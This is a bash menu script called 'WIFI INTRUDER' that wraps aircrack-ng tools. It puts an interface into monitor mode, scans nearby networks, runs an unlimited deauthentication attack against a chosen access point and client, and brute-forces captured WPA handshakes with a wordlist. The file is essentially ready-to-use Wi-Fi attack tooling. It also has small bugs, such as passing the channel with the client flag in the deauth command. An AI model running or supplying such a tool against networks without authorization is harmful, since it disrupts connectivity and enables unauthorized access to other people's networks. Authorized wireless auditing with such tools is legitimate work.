#!/bin/bash

declare -r greenColour="\e[0;32m"
declare -r endColour="\e[0m"
declare -r redColour="\e[0;31m"
declare -r blueColour="\e[0;34m"
declare -r yellowColour="\e[0;33m"
declare -r turquoiseColour="\e[0;36m"
declare -r grayColour="\e[0;37m"

start_monitor_mode() {
  read -p "Enter the network interface name:" INTERFACE
  sudo airmon-ng check kill
  sudo ip link set "$INTERFACE" down
  sudo ip link set "$INTERFACE" up
  sudo airmon-ng start "$INTERFACE"
  read -p "$Enter to return to the menu"
}

stop_monitor_mode() {
  read -p "Enter the network interface name:" INTERFACE
  sudo airmon-ng stop "$INTERFACE"
  /etc/init.d/networking restart
  read -p "Enter to return to the menu"
}

network_scan() {
  read -p "Enter the network interface name:" INTERFACE
  sudo airodump-ng "$INTERFACE"
  read -p "Enter to return to the menu"
}

attack_deauth() {
  read -p "Enter the network interface name:" INTERFACE
  read -p "CHANNEL OF TARGET:" channel
  read -p "ACCESS POINT TARGET MAC:" mac_ap
  read -p "CLIENT TARGET MAC:" mac_cliente
  aireplay-ng --deauth 0 -c "$channel" -a "$mac_ap" -c "$mac_cliente" "$INTERFACE"
  read -p "Enter to return to the menu"
}

handshake_brute_force() {
  read -p "$Enter the path of the handshake file:" handshake_file
  read -p "$Enter the dictionary path to use:" wordlist_file
  aircrack-ng "$handshake_file" -w "$wordlist_file"
  read -p "Enter to return to the menu"
}

scan_specific_target_network() {
  read -p "Enter the network interface name:" INTERFACE
  read -p "CHANNEL OF TARGET:" channel
  read -p "ESSID OF TARGET MAC:" essid
  airodump-ng -c "$channel" --essid "$essid" "$INTERFACE"
  read -p "Enter to return to the menu"
}

while true; do
  clear
  echo -e "${blueColour}WIFI${endColour}${redColour}INTRUDER${endColour}"
  echo -e "By: ${redColour}Franco Agustin Perez${endColour}"
  echo -e "By: ${blueColour}https://t.me/freesauce419${endColour}"
  echo -e "Choose an option:"
  echo -e "1. ${greenColour}Start Monitor Mode${endColour}"
  echo -e "2. ${redColour}Stop Monitor Mode${endColour}"
  echo -e "3. ${yellowColour}Network Scan${endColour}"
  echo -e "4. ${turquoiseColour}Scan Specific Target-Network${endColour}"
  echo -e "5. ${grayColour}Attack Deauth${endColour}"
  echo -e "6. ${blueColour}Handshake Brute-Force${endColour}"
  echo -e "7. ${redColour}Exit${endColour}"
  read -p "Option:" option

  case $option in
    1) start_monitor_mode ;;
    2) stop_monitor_mode ;;
    3) network_scan ;;
    4) scan_specific_target_network ;;
    5) attack_deauth ;;
    6) handshake_brute_force ;;
    7) break;;
    *) echo -e "Invalid option, please select a valid option" ;;
  esac
done
